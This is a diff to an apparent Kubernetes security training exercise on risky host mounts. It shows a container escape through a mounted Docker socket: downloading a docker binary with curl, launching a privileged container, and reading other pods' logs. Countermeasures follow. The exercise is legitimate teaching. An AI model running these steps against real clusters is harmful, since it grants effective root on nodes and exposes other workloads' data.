@@ -52,8 +52,8 @@ kubectl get po -n mounts
 ```
 
 Then get into it:
-```
-kubectl exec -it -n mounts <pod> bash
+```bash
+kubectl exec -it -n mounts $(kubectl get po -n mounts --output=jsonpath='{.items[0].metadata.name}') bash
 ```
 
 Now, try some host modifications and information gathering attempts:
@@ -78,25 +78,47 @@ What else can you come up with?
 Note that this deployment is extra-dangerous because it mounts the Docker socket.
 That's a great way for your container to have effectively root privileges on the node.
 
-Let's see what we can do:
+First, let's install `curl` to download some more tools:
 
 ```
 apt-get update
 apt-get install -y curl
+```
+
+Next, let's install Docker and show the running containers on the host:
+
+```bash
 curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
 ./docker/docker ps
+```
+
+And let's use our access to launch a privileged container (more on this in [a later exercise](../65-privileged)):
+```
 ./docker/docker run --rm -it --privileged ubuntu
 ```
 
-Use ctrl-D to exit once you've finished poking around.
-(Now you're back in the pod.)
+This container has elevated access to the host.
+You can do whatever you like, though your container still has its own file system and process namespaces, so it's not _precisely_ like being on the host.
+We'll cover more about privileged containers in [a later exercise](../65-privileged).
 
-Let's use some of the other mounts. For instance, we could spy on other containers' logs:
+Hit `ctrl-D` to exit once you've finished poking around.
+
+Now you're back in the pod.
+
+Let's use some of the other mounts in our simulated agent.
+For instance, we could spy on other containers' logs:
 ```
 ls /var/log/pods
 ```
 
-Pick a pod you're interested in, then see what you can learn from the logs.
+Pick a pod you're interested in, then see what you can learn from the logs:
+
+```
+ls /var/log/pods/<your-pod-name>
+... continue checking things out ...
+```
+
+Hit `Ctrl-D` to exit the pod.
 
 ### Countermeasure
 We can:
@@ -109,7 +131,7 @@ depending on the access we actually need.
 
 This can require a bit of application knowledge, so is often best done with the team that maintains or operates the app.
 
-Let's see what our improved deployment changes:
+Let's see what our improved deployment changes (a few mounts removed, and one marked read-only):
 
 ```
 kubectl diff -f https://securek8s.dev/agent/improved.yaml
@@ -121,14 +143,14 @@ Then let's deploy it:
 kubectl apply -f https://securek8s.dev/agent/improved.yaml
 ```
 
-Find a pod:
+Make sure the old pod has been deleted, and the new one is marked `Running`:
 ```
 kubectl get po -n mounts
 ```
 
 Then get into it:
 ```
-kubectl exec -it -n mounts <pod> bash
+kubectl exec -it -n mounts $(kubectl get po -n mounts --output=jsonpath='{.items[0].metadata.name}') bash
 ```
 
 ### Attack effects after patching
@@ -137,15 +159,24 @@ find out information you can't read!
 
 Note that the Docker socket [still **does** work](https://news.ycombinator.com/item?id=17983623) despite us mounting it read-only:
 
+Install `curl`:
+
 ```
 apt-get update
-apt-get install curl
+apt-get install -y curl
+```
+
+Download and use `docker`:
+
+```bash
 curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
 ./docker/docker ps
 ./docker/docker run --rm -it --privileged ubuntu
 ```
 
 If we try some of the same manipulations we tried earlier, they'll fail.
+
+Hit `Ctrl-D` to exit the pod when you're done.
 
 ### How to use it yourself
 If you use an application that needs to know something about the host,
